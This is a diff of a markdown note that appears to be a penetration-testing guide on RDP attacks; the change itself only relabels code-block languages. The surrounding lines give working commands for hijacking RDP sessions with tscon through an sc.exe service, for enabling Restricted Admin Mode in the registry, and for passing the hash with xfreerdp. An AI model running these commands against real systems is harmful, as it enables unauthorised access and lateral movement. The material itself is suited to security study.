@@ -41,7 +41,7 @@ PS C:\> tscon [TARGET_SESSION_ID] /dest:[OUR_SESSION_NAME]
 ```
 
 We can use the [Microsoft sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) to create a new service running as the `Local System` user to perform our goal:
-```cmd
+```batch
 C:\> sc.exe create [service_name] binpath= "[command_to_run]"
 C:\> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
 
@@ -54,12 +54,12 @@ C:\> net start sessionhijack
 Under certain circumstances, PtH can be achieved via RDP to gain GUI access using a tool like [[xfreerdp]].
 - `Restricted Admin Mode` must be enabled (*disabled by default*) on the target host.
 	- The `DisableRestrictedAdmin` (*REG_DWORD*) key can be added to the `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value 0.
-```cmd
+```batch
 C:\> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
 
 Once enabled, we can use [[xfreerdp]] and the `/pth` option to gain access
-```sh
+```bash
 $ xfreerdp /v:[target_ip] /u:[user] /pth:[hash]
 ```
 User Account Control (UAC) can limit a local user's ability to perform remote administration operations. If the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0, only the built-in local admin can perform these operations. Setting it to 1 will allow other local admins.
